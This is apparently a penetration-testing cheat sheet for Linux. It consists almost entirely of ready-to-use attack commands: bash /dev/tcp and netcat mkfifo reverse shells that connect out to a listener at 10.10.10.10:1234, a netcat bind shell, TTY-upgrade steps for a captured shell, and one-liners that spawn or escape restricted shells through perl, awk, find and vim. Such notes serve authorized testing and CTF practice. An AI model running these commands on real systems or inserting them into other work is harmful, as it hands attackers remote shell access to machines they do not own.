# Linux

## Reverse Shell Generator

{% embed url="https://www.revshells.com/" %}

## Reverse shell

| Command                                                                              | Description                                                    |
| ------------------------------------------------------------------------------------ | -------------------------------------------------------------- |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                | Send a reverse shell from the remote server                    |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2>&1\\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2>&1\\|nc -lvp 1234 >/tmp/f`      | Start a bind shell on the remote server                        |

## TTY



{% tabs %}
{% tab title="Python 3" %}
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
{% endtab %}

{% tab title="Python 2" %}
`python -c 'import pty;pty.spawn("/bin/bash")'`
{% endtab %}
{% endtabs %}

Which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys.

`export TERM=xterm`

This will give us access to term commands such as clear.

Finally (and most importantly) we will background the shell using

`Ctrl + Z`

Back in our own terminal we use

`stty raw -echo; fg`

This does two things: first, it turns off our own terminal echo which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes

`stty rows 38 columns 116`

## Interactive Shell



| Command                                                                 | Description                                                                                        |
| ----------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| `/bin/sh -i`                                                            | Spawns an interactive shell on a linux-based system                                                |
| `perl —e 'exec "/bin/sh";'`                                             | Uses `perl` to spawn an interactive shell on a linux-based system                                  |
| `ruby: exec "/bin/sh"`                                                  | Uses `ruby` to spawn an interactive shell on a linux-based system                                  |
| `Lua: os.execute('/bin/sh')`                                            | Uses `Lua` to spawn an interactive shell on a linux-based system                                   |
| `awk 'BEGIN {system("/bin/sh")}'`                                       | Uses `awk` command to spawn an interactive shell on a linux-based system                           |
| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Uses `find` command to spawn an interactive shell on a linux-based system                          |
| `find . -exec /bin/sh \; -quit`                                         | An alternative way to use the `find` command to spawn an interactive shell on a linux-based system |
| `vim -c ':!/bin/sh'`                                                    | Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape “jail-shells”      |
